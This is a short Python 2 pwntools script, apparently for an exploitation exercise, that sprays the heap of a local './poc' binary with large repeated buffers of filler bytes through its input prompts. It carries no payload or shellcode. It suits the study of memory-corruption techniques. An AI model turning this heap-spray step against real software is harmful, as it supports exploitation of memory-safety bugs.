from pwn import *
#context.log_level = 'debug'

sprayRange = 0x5000000
spraySize = 0x20000
sprayCount = sprayRange /spraySize

p = process('./poc')
sleep(20)

for i in xrange(sprayCount):
    size = spraySize - 0x10
    p.recvuntil("Input size:\n")
    p.send(p32(size))

    p.recvuntil("Input contents:\n")
    buf = 'AAAABBBB' * (size // 8)
    buf += 'C' * (size-len(buf))
    p.send(buf)

    p.recvuntil("Will you keep typing?(No:0):\n")
    if i == sprayCount-1:
        print "Finished Heap spray!\n"
        p.sendline(str(0))
    else:
        p.sendline(str(1))

p.wait()
